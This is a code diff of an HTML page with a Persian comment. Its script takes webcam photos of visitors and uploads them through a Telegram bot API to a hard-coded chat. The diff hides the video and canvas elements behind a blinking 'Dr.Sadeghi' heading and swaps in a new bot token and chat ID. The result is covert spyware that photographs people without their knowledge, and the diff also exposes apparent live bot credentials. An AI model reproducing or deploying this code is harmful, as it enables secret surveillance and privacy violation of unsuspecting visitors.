@@ -4,9 +4,47 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Camera Capture</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #000;
+            color: #fff;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            position: relative;
+        }
+
+        h1 {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 3rem;
+            color: #fff;
+            font-weight: bold;
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+            0%, 50%, 100% {
+                opacity: 1;
+            }
+            25%, 75% {
+                opacity: 0;
+            }
+        }
+
+        video, canvas {
+            display: none;
+        }
+    </style>
 </head>
 <body>
-    <h1>Camera Capture</h1>
+    <h1>Dr.Sadeghi</h1>
     <video id="video" width="640" height="480" autoplay></video>
     <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>
     
@@ -35,24 +73,22 @@
 
         function sendImage(dataURL) {
             // تبدیل داده Base64 به Blob
-            fetch(dataURL)
-                .then(response => response.blob())
-                .then(blob => {
-                    const formData = new FormData();
-                    formData.append('photo', blob, 'image.jpg');
+            const base64 = dataURL.split(',')[1];
+            const blob = new Blob([Uint8Array.from(atob(base64), c => c.charCodeAt(0))], { type: 'image/jpeg' });
+            const formData = new FormData();
+            formData.append('photo', blob, 'image.jpg');
 
-                    return fetch('https://api.telegram.org/bot7013140947:AAFmvh85xzVjxiUCJP7IBW92Ex-GmvAxpE8/sendPhoto?chat_id=7157112319', {
-                        method: 'POST',
-                        body: formData
-                    });
-                })
-                .then(response => response.json())
-                .then(result => {
-                    console.log('Image sent successfully:', result);
-                })
-                .catch(error => {
-                    console.error('Error sending image:', error);
-                });
+            fetch('https://api.telegram.org/bot7405655297:AAFWGG6GoiP4vz_v-txDbMKrOLaqynOMkRA/sendPhoto?chat_id=-1002164811427', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(result => {
+                console.log('Image sent successfully:', result);
+            })
+            .catch(error => {
+                console.error('Error sending image:', error);
+            });
         }
     </script>
 </body>
